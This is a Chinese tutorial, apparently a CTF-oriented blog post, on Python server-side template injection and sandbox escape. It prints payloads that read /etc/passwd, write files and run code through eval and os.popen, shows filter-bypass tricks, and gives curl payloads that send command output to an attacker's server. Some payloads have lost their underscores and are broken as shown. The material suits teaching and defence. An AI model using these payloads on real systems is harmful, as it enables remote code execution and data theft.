作者：s1mple-safety合天智汇

​ 起初学习ssti的时候，就只是拿着tplmap一顿乱扫，然后进行命令执行，之前深入学习了一下PYthon继承链；今天写个文章进行加深记忆和理解；

## 基础知识  

class

返回一个实例所属的类；

![v2-3f99ffb3b8810dc3df4c3c7b919704be_720w](https://pic4.zhimg.com/80/v2-3f99ffb3b8810dc3df4c3c7b919704be_720w.png)

这里可以看到返回了s1mple 类；

globals

返回一个当前的空间之下可以利用的模块，方法和变量的字典； 使用方法为 函数名.globals

![v2-e088c505a07c4407846ee5843aba4451_720w](https://pic1.zhimg.com/80/v2-e088c505a07c4407846ee5843aba4451_720w.png)

subclasses()

返回一个类的子类，是列表的形式；

![v2-692ef3530fd3ece04fcec617640af008_720w](https://pic1.zhimg.com/80/v2-692ef3530fd3ece04fcec617640af008_720w.png)

builtin && builtins

在PYthon中是可以直接运行一些内敛函数的，这些函数我们在builtin中可以看到；

![v2-4a8dff8258b87838903104773eb2ab23_720w](https://pic4.zhimg.com/80/v2-4a8dff8258b87838903104773eb2ab23_720w.png)

## PYthon继承链在ctf中的实战--------沙盒逃逸  

基本想法：：：在PYthon的object中集成了很多的基础函数；我们可以尝试利用进行文件的读取或者写入；

这里我要声明一下，沙箱逃逸中；py2和py3是不一样的；首先来拿py2来进行讨论；

这里我们可以基于上面的基础知识；

先查看所有的object；然后再找file

![v2-d6e143ac8df76a55c77ed9f5ed65b5e2_720w](https://pic3.zhimg.com/80/v2-d6e143ac8df76a55c77ed9f5ed65b5e2_720w.png)

().class.mro[1].subclass()[40]

![v2-8e7031da20989978b59256b859ffe56c_720w](https://pic2.zhimg.com/80/v2-8e7031da20989978b59256b859ffe56c_720w.png)

就可以拿到file；然后我们看看其可以使用的内置方法，

![v2-d8f4ad60cd16f61b512635acd022b957_720w](https://pic3.zhimg.com/80/v2-d8f4ad60cd16f61b512635acd022b957_720w.png)

这里可以看到有个内置的read方法，因为存在file的object，所以我们需要利用这个点去进行文件读取；

语法为

    
    
    ().class.mro[1].subclass()[40] ('xxxxxx').read()

![v2-a13a7a78b7148405b27a89a9b0c26e30_720w](https://pic2.zhimg.com/80/v2-a13a7a78b7148405b27a89a9b0c26e30_720w.png)

也可以进行文件的写入。用的则是write；语法为().class.mro[1].subclass()[40] (路径+文件名).write('内容')

然后还有个基类可以进行任意命令的执行；是 warnings.catch_warnings

().class.mro[1].subclasses()[59]

![v2-13eab281acfe0df3760c303d6690d92a_720w](https://pic3.zhimg.com/80/v2-13eab281acfe0df3760c303d6690d92a_720w.png)

然后调用方法eval进行任意命令执行；

![v2-3054a2348be477e8d54d393c15ca22bf_720w](https://pic2.zhimg.com/80/v2-3054a2348be477e8d54d393c15ca22bf_720w.png)

## 有没有PY2和PY3通吃的方法呢？  

答案是有的；之前介绍了builtins

    
    
    py2：().class.bases[0].subclasses()[59].init.globals['builtins']'eval'
    py3：().class.bases[0].subclasses()[64].init.globals['builtins']'eval'

都可以进行任意代码执行；

## 有过滤该怎么办？  

下面介绍多种的绕过方式，进行绕过；

### 如果过滤了敏感的字符，比如eval os 等等的  

可以考虑使用编码解码绕过；可采用base64；或者rot13,16进制和字符转化等等的编码进行绕过；这里演示一下base64编码eval进行绕过限制eval的情况，发现可以正常的执行；

![v2-b45b840d6d5635a1758df4fe703bb8c4_720w](https://pic2.zhimg.com/80/v2-b45b840d6d5635a1758df4fe703bb8c4_720w.png)

### 过滤了中括号[]怎么绕过去；  

这里我提供的是getitem()进行绕过；

![v2-4f31bc4de57db7056e79568fb87aee06_720w](https://pic1.zhimg.com/80/v2-4f31bc4de57db7056e79568fb87aee06_720w.png)

这里发现可以执行成功；那么我们只需要将我们执行中的【】全部换成我们的getitem即可，那么问题来了，后面的[eval]怎么绕过呢；这里介绍一下
函数['属性'] === 函数.属性

''.__class__.__mro__[2].__subclasses__().__getitem__(59).__init__.__globals__.__builtins__.eval("__import__('os').popen('cat
/etc/passwd').read()") 这样就可以绕过去了，但是我在本地py环境下测试的时候发现不是那么流畅，可能是py还需要加载什么东西吧；

### 过滤了 ' " 怎么绕过去；  

过滤了这些绕过方式有些局限性，因为这里需要对漏洞的接收参数格式有严格的要求，必须是get或者post型的；而且get型的必须是类似于?s1mple=
这样的接收方式才可以进行利用；那么也就决定了在现实的沙盒逃逸中是不可行的，但是对于某些ctf题目来说却是可行的；那就是利用request来进行传值；

    
    
    request.args.xx
    {{[].__class__.__mro__[1].__subclasses__()[40] (request.args.s1mple).read()}}&s1mple=/etc/passwd

还有一种是通过chr进行绕过；（ascii码）不过这中情况一般很少用；

### 过滤了双下划线怎么绕过  

依然是可以通过request 进行传参的；给个例子；

    
    
    ()[request.args.class].__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__'eval'&class=class

### 过滤了{{ 怎么绕过  

这里研究起源于做的一道ctf题目，当时fuzz了一下，发现过滤了{{
这里想到直接浏览器读取肯定是不可能的了；这里其实很明显了，我们利用远程SSTI把结果打到我们自己的服务器上去；至于绕过 {{ 则可以采用 {%if
xxxxx}1{% endif %}，这里给出一个实例；；

{% if
''.class.mro[2].subclasses()[59].init.func_globals.linecache.os.popen('curl
http://ip:port/?i=whoami').read()=='p' %}1{% endif %}
如果是post的话，则可以采用另外的方法；利用curl -d 直接来传；{% iconfigf
''.claconfigss.mconfigro[2].subclasconfigses()[59].init.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl
http://yourip:port/ -d ls / | grep flag;') %}1{% endiconfigf %}

实验推荐：

http://hetianlab.com/expc.do?ec=ECID87ed-2223-40e5-8083-f5c55d69af28

（服务端模板注入是指用户输入的参数被服务端当成模板语言进行了渲染，导致代码执行。）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

